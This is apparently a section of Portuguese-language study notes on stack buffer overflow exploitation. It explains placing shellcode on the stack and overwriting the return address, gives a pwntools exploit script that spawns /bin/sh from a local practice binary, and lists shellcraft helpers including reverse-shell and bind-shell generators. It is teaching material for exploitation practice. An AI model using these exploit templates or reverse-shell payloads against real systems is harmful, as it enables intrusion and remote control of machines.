# 5. Buffer Overflow - Shellcode

Shellcode é código assembly. É pequeno. A ideia é colocar na stack, colocar o endereço do início do Shellcode no `return address` e mandar a RIP pra lá.

1. Identifique se é possível fazer BOF
2. Coloque o **Shellcode no Input** + **Padding até `return address`** + **Endereço do início do Shellcode na stack**
3. Sim, acabamos de mandar o `RIP` executar instrução na stack.

Exemplo com pwntools, abrindo uma shell (`shellcraft.sh()`):

```py
from pwn import *

context.binary = ELF('./program')

p = process()

payload = asm(shellcraft.sh())          # Shellcode
payload = payload.ljust(312, b'A')      # Padding
payload += p32(0xffffcfb4)              # Endereço do Shellcode

log.info(p.clean())

p.sendline(payload)

p.interactive()
```

## 5.1 ShellCode + pwntools

```py
# Shellcodes prontos populares
shellcraft.sh()           # /bin/sh
shellcraft.cat('file')    # cat file
shellcraft.dupsh()        # Duplica shell para fd
shellcraft.echo('text')   # Imprime texto
shellcraft.exit()         # Sai do processo
shellcraft.findpeersh()   # Encontra peer shell

# Redes
shellcraft.connect('ip', port)
shellcraft.bindsh(port)
shellcraft.reverse('ip', port)

# Sistema de arquivos
shellcraft.getdents(fd)
shellcraft.getcwd()
```

Exemplo: 

```py
#!/usr/bin/env python3
from pwn import *

# Configurar
context.binary = ELF('./program')

p = process()

print("Gerando shellcode /bin/sh...")

# Gerar shellcode
shellcode = asm(shellcraft.sh())

print(f"Shellcode: {len(shellcode)} bytes")
print(hexdump(shellcode))

# Disassemblar para ver as instruções
print("\\nInstruções Assembly:")
print(disasm(shellcode))

# Testar (opcional - descomente para executar)
# print("\\n🚀 Executando shellcode...")
# p = run_shellcode(shellcode)
# p.interactive()
```
